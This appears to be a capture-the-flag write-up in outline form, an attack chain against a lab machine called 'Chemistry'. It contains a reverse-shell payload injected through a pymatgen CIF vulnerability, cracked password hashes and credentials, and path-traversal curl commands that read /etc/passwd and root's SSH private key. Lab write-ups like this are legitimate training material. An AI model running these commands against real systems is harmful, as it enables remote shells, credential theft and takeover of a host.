### Enumeration
```
IP=10.10.11.38
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- ./nmap
	- 10.10.11.38
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
- 5000
	- upnp
### Foothold
- 5000
	- Default landing page
		- Chemistry01
	- Directory Brute force
		- dirsearch -u http://$IP:5000
			- /login
			- /register
			- /upload
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
			- /login
				- admin:admin
					- Chemistry02
			- /register
				- admin:admin
					- Chemistry03
				- admin123:admin123
					- Creates account
						- Chemistry04
	- Versions
		- CIF file
			- CVE-2024-23346
				- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
				- Changed this part of code `("os").system ("busybox nc 10.10.14.154 443 -e sh");0,0,0'
				- Landed a rev shell
				- Chemistry05
### PE
#### Linux
- app
	- id
		- uid=1001(app) gid=1001(app) groups=1001(app)
	- Root drive directory
		- nothing abnormal
	- sudo -l
		- requires password
		- Tried
			- app, root, MyS3cretCh3mistry4PP
	- uname -a
		- `Linux chemistry 5.4.0-196-generic #216-Ubuntu SMP Thu Aug 29 13:26:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- ping cap_net_raw+ep
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
		- ./GTFOBins_SUID.py
			- Nothing from output
	- Users with console
		- app
			- app.py
				- Chemistry06
				- Possible sql login
					- app:MyS3cretCh3mistry4PP
			- /instance/database.db
				- Chemistry07
				- Chemistry08
				- Crackstation
					- rosa:63ed86ee9f624c7b14f1d4f43dc251a5
						- unicorniosrosados
					- admin:2861debaf8d99436a10ed6f75a252abf
						- not found
		- rosa
			- su rosas
				- MyS3cretCh3mistry4PP, rosa
					- failed
				- unicorniosrosados
					- Succeed
	- netstat -ano
		- Active ports
			- 8080, 53
	- Directories to check
		- /opt
			- Check GTFO Bins. Treated as SUID
			- monitoring_site
				- Owned by root
		- /etc/crontab
			- nothing
	- linpeas
		- Possible Exploits
		- Interesting Files
		- Nothing
	- pspy64
- rosa
	- id
		- uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
	- history
		- nothing
	- sudo -l
		- unicorniosrosados
			- Can't run sudo
	- suid
		- nothing new
	- linpeas
		- nothing new
	- Port 8080
		- Setup port forward
			- ssh -f -N -D 1080 rosa@10.10.11.38
		- proxychains dirsearch -u http://127.0.0.1:8080
			- Nothing
		- proxychains nikto -h http://127.0.0.1:8080
			- Server: Python/3.9 aiohttp/3.9.1
			- Google aiohttp 3.9.1 exploit
				- LFI - https://github.com/z3rObyte/CVE-2024-23334-PoC
			- Chemistry09
		- LFI
			- `proxychains curl -s --path-as-is "http://127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../etc/passwd"`
			- Outputs etc/passwd file
		- `proxychains curl -s --path-as-is "http://127.0.0.1:8080/assets/../../../../../../../../../../../../../../../../../../root/.ssh/id_rsa"
			- outputs root id_rsa
			- Chemistry10
- root
	- Chemistry11
### Credentials
### Lessons Learned